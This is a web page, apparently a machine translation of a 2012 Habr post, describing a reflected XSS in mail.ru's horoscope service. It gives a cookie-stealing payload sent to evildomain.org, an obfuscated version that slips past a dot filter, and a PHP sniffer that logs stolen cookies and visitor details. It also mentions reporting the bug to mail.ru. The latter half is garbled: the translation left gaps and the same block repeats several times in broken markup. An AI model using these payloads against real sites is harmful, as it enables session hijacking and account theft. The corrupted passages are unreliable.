<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Passive XSS on mail.ru and ready exploit</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="There was nothing to do, it was evening. 
 Once sat, the usual unremarkable scripts at home, behind his cold, but no less comfortable PC. Recently, he...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Passive XSS on mail.ru and ready exploit</h1><div class="post__text post__text-html js-mediator-article"><h5>  There was nothing to do, it was evening. </h5><br>  Once sat, the usual unremarkable scripts at home, behind his cold, but no less comfortable PC.  Recently, he liked to stuff in various forms on the forums and websites of various character sets, one way or another designed for one purpose: to destroy the html block of the input field.  He is a pervert, he was pleased to help people.  The resource administrator, being informed, with or without his help, eliminated the vulnerability found, each such case was epic WIN for him. <br><br>  But this evening was unusual, because he did not go to another forum, or a private site, he opened mail.ru and thought, why not? <br><a name="habracut"></a><br><h5>  Start... </h5><br>  The first step was to identify the victim <br><img src="https://habrastorage.org/storage2/929/d70/53b/929d7053b9ee6a9c27924e69c88529a3.png"><br><br>  For the victims were selected "Lady" and "Horoscopes."  The selection principle was: ‚Äúwhich project is less interesting for it specialists?‚Äù. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Shortly after having kicked the Lady, he began to work on Horoscopes.  Here I was interested in the block with horoscopes for all occasions, which changed when the page was updated. <br><img src="https://habrastorage.org/storage2/d32/062/ab1/d32062ab1f33bd1f80b2ac25c77723d9.png"><br><img src="https://habrastorage.org/storage2/766/989/81e/76698981e17c2797c692205969a66fbb.png"><br><br>  Inserting a plain <b>"&gt; Test</b> we see: <br><img src="https://habrastorage.org/storage2/ebb/c2d/7c8/ebbc2d7c8d06d0a82b93b680a298a81c.png"><br><br>  For a start, not bad.  Now we look at the form data in which we will send our malware.  Open the source of the page and look at the code of the vulnerable output field: <br><img src="https://habrastorage.org/storage2/015/27e/a52/01527ea524c0dcfcb45491edc614fa09.png"><br><br>  Input form code: <br><img src="https://habrastorage.org/storage2/a10/975/03b/a1097503bf705f6d7516578d9e034a44.png"><br><br>  and input field code: <br><img src="https://habrastorage.org/storage2/0bd/be2/5d6/0bdbe25d6bb7930ce614977de78f24c7.png"><br><br>  From which we extract here such a link: <br>  <code>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</code> XSS <br><br><h5>  <s>Pen</s> Tests </h5><br>  The next step is to check the field for filtering characters. <br><br>  Follow the link: <br>  <code>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</code> text "&gt; -.- &lt;a and see that the point is filtered <br><img src="https://habrastorage.org/storage2/47b/c8f/65a/47bc8f65a69d64b762b61ec742fcc150.png"><br><br>  <code>&lt;a</code> used as a short garbage cutter, from the remnants of a broken tag.  Otherwise there will be debris covering the previous tag, like this: <br><img src="https://habrastorage.org/storage2/1a3/3fc/5ab/1a33fc5abac111a68d0f79f1f6d31712.png"><br><br>  We have determined that the field filters the point, i.e. <pre> <code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt;&lt;script&gt;alert();&lt;script&gt;</span></span></code> </pre> <br><br>  work, but <br>  no, because  at the output we get <br><br><br><h5>  Obfuscator </h5><br>  We need to execute a code on the page that will pass a cookie to a sniffer, like this: <br><pre> <code class="hljs scala">img=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-type"><span class="hljs-type">Image</span></span>(); img.src=<span class="hljs-symbol"><span class="hljs-symbol">'http</span></span>:<span class="hljs-comment"><span class="hljs-comment">//evildomain.org/g/sniff.php?cookie='+document.cookie;</span></span></code> </pre> <br><br>  To bypass the point filtering in the code, it is necessary to obfuscate it, for this, the scripts use different resources, in this particular <a href="http://www.javascriptobfuscator.com/default.aspx">www.javascriptobfuscator.com/default.aspx</a> was used. <br><br>  We give him at the entrance to the usual JS: <br><pre> <code class="hljs scala">img=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-type"><span class="hljs-type">Image</span></span>(); img.src=<span class="hljs-symbol"><span class="hljs-symbol">'http</span></span>:<span class="hljs-comment"><span class="hljs-comment">//evildomain.org/g/sniff.php?cookie='+document.cookie;</span></span></code> </pre><br><br>  The output is quite angry JS, without points: <br> <code>var _0xdfd0=["\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x65\x76\x69\x6C\x64\x6F\x6D\x61\x69\x6E\x2E\x6F\x72\x67\x2F\x67\x2F\x73\x6E\x69\x66\x66\x2E\x70\x68\x70\x3F\x63\x6F\x6F\x6B\x69\x65\x3D","\x63\x6F\x6F\x6B\x69\x65"];img= new Image();img[_0xdfd0[0]]=_0xdfd0[1]+document[_0xdfd0[2]];</code> <br> <br>  We frame <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code></code> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> <pre> <code class="hljs bash"><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?<span class="hljs-built_in"><span class="hljs-built_in">type</span></span>=prg&amp;so_nm=</i> <span class="hljs-string"><span class="hljs-string">"&gt;&lt;a</span></span></code><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">     </span></span><code><span class="hljs-string"><span class="hljs-string">http://evildomain.org/g/sniff.php</span></span></code><span class="hljs-string"><span class="hljs-string">  ,      ,    : </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><code><span class="hljs-string"><span class="hljs-string">&lt;?php if (isset(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$_GET</span></span></span><span class="hljs-string">['cookie'])) { </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$text</span></span></span><span class="hljs-string"> = "</span></span>New cookie accept from <span class="hljs-string"><span class="hljs-string">". </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$_SERVER</span></span></span><span class="hljs-string">['REMOTE_ADDR'] ."</span></span> at <span class="hljs-string"><span class="hljs-string">". date('l jS \of FY h:i:s A'); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$text</span></span></span><span class="hljs-string"> .= "</span></span>\n<span class="hljs-string"><span class="hljs-string">".str_repeat("</span></span>=<span class="hljs-string"><span class="hljs-string">", 22) . "</span></span>\n<span class="hljs-string"><span class="hljs-string">" . </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$_GET</span></span></span><span class="hljs-string">['cookie']."</span></span>\n<span class="hljs-string"><span class="hljs-string">".str_repeat("</span></span>=<span class="hljs-string"><span class="hljs-string">", 22)."</span></span>\n<span class="hljs-string"><span class="hljs-string">"; </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$file</span></span></span><span class="hljs-string"> = fopen("</span></span>./sniff.txt<span class="hljs-string"><span class="hljs-string">", "</span></span>a<span class="hljs-string"><span class="hljs-string">"); fwrite(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$file</span></span></span><span class="hljs-string">, </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$text</span></span></span><span class="hljs-string">); fclose(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$file</span></span></span><span class="hljs-string">); } </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$date</span></span></span><span class="hljs-string">=date("</span></span>[D|d/m/Y|H:i]<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$ip</span></span></span><span class="hljs-string">=getenv("</span></span>Remote_addr<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$real_ip</span></span></span><span class="hljs-string">=getenv("</span></span>HTTP_X_FORWARDED_FOR<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$otkuda</span></span></span><span class="hljs-string">=getenv("</span></span>HTTP_REFERER<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$browser</span></span></span><span class="hljs-string">=getenv("</span></span>HTTP_USER_AGENT<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$win</span></span></span><span class="hljs-string">=getenv("</span></span>windir<span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$uid</span></span></span><span class="hljs-string">=implode(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$argv</span></span></span><span class="hljs-string">,"</span></span> <span class="hljs-string"><span class="hljs-string">"); </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$fp</span></span></span><span class="hljs-string">=fopen("</span></span>./log.txt<span class="hljs-string"><span class="hljs-string">","</span></span>a<span class="hljs-string"><span class="hljs-string">"); fputs(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$fp</span></span></span><span class="hljs-string">,"</span></span><span class="hljs-variable"><span class="hljs-variable">$date</span></span>\t|<span class="hljs-variable"><span class="hljs-variable">$uid</span></span>|\t<span class="hljs-variable"><span class="hljs-variable">$ip</span></span>(<span class="hljs-variable"><span class="hljs-variable">$real_ip</span></span>)\t<span class="hljs-variable"><span class="hljs-variable">$browser</span></span>\t<span class="hljs-variable"><span class="hljs-variable">$otkuda</span></span>\t<span class="hljs-variable"><span class="hljs-variable">$win</span></span>\n<span class="hljs-string"><span class="hljs-string">"); fclose(</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$fp</span></span></span><span class="hljs-string">); ?&gt;</span></span></code><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">  . </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">  </span></span><br><span class="hljs-string"><span class="hljs-string">          IE     :). ,   Chrome,  XSS. </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">         html    ,       ,       mail.ru ( FF  Opera)   : </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">     ,    ,       mail.ru,    . </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">  mail.ru   </span></span><br><span class="hljs-string"><span class="hljs-string">       29.06.2012: Ticket#2012062921010318 </span></span><br><span class="hljs-string"><span class="hljs-string">   : </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><i><span class="hljs-string"><span class="hljs-string">. </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">     . </span></span><br><span class="hljs-string"><span class="hljs-string">    . </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">   . </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">  ,  . </span></span><br><span class="hljs-string"><span class="hljs-string">    </span></span><br><span class="hljs-string"><span class="hljs-string">   Mail.ru</span></span></i><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string"> </span></span><br><span class="hljs-string"><span class="hljs-string">       ,    mail.ru    .</span></span></code> </pre> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> <h5> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> </h5> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> <h5> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> </h5> <code><code>    XSS,   : <br> <i>http:\\horo.mail.ru/personal.html?type=prg&amp;so_nm=</i> "&gt;&lt;a</code> <br> <br>     <code>http://evildomain.org/g/sniff.php</code>  ,      ,    : <br> <code>&lt;?php if (isset($_GET['cookie'])) { $text = "New cookie accept from ". $_SERVER['REMOTE_ADDR'] ." at ". date('l jS \of FY h:i:s A'); $text .= "\n".str_repeat("=", 22) . "\n" . $_GET['cookie']."\n".str_repeat("=", 22)."\n"; $file = fopen("./sniff.txt", "a"); fwrite($file, $text); fclose($file); } $date=date("[D|d/m/Y|H:i]"); $ip=getenv("Remote_addr"); $real_ip=getenv("HTTP_X_FORWARDED_FOR"); $otkuda=getenv("HTTP_REFERER"); $browser=getenv("HTTP_USER_AGENT"); $win=getenv("windir"); $uid=implode($argv," "); $fp=fopen("./log.txt","a"); fputs($fp,"$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n"); fclose($fp); ?&gt;</code> <br> <br>  . <br> <br>  <br>          IE     :). ,   Chrome,  XSS. <br> <br>         html    ,       ,       mail.ru ( FF  Opera)   : <br> <img src="http://habrastorage.org/storage2/f6c/811/5bb/f6c8115bb61cfab9ac5fe5ba96bd8ea6.png"> <br> <br>     ,    ,       mail.ru,    . <br> <br>  mail.ru   <br>       29.06.2012: Ticket#2012062921010318 <br>   : <br> <br> <i>. <br> <br>     . <br>    . <br> <br>   . <br> <br>  ,  . <br>    <br>   Mail.ru</i> <br> <br>       ,    mail.ru    .</code> </div><p>Source: <a href="https://habr.com/ru/post/149134/">https://habr.com/ru/post/149134/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../149126/index.html">Software-configured networks - how does it work?</a></li>
<li><a href="../149127/index.html">Public API status: online + weekly statistics</a></li>
<li><a href="../149128/index.html">Laptop review Dell Alienware M18x</a></li>
<li><a href="../149130/index.html">Runet Today, August 6, 2012 Experts of the issue: Mael Gave, Maxim Kashulinsky</a></li>
<li><a href="../149131/index.html">64-bit Haiku and the OpenJDK port are just around the corner</a></li>
<li><a href="../149135/index.html">Queuing calls to the native library from managed code with Dispatcher</a></li>
<li><a href="../149136/index.html">NASA, Mars and crowdfunding</a></li>
<li><a href="../149137/index.html">File substitution in HTTP traffic</a></li>
<li><a href="../149139/index.html">Writing a plugin for Netbeans. Part two</a></li>
<li><a href="../149142/index.html">The book "Freelancers and Shabashniki"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>